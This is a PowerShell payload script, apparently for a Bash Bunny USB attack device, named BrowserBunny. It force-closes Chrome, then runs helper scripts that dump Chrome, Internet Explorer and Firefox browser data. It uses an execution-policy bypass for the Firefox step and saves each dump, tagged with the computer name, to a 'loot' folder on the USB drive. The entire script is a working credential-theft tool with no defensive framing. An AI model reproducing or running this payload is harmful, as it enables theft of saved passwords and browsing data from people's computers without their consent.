# Kill Chrome is open / Take note if was open
$error.clear()
Stop-Process -name "chrome"

# Using wakas to output the results rather than -OutFile so I can keep variables in this file.
# Run the PS1 files
$tools = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'myprograms')
$dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\BrowserBunny')
New-Item -ItemType directory -Path $dest
$rndm = Get-Random
& "$tools\chrm.ps1" > "$dest\$env:computername-$rndm-chrome.txt"
& "$tools\ie.ps1"  > "$dest\$env:computername-$rndm-ie.txt"

# Have to run a 32bit PS for firefox dumping
& "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -Exec bypass "$tools\ff.ps1" > "$dest\$env:computername-$rndm-ff.txt"
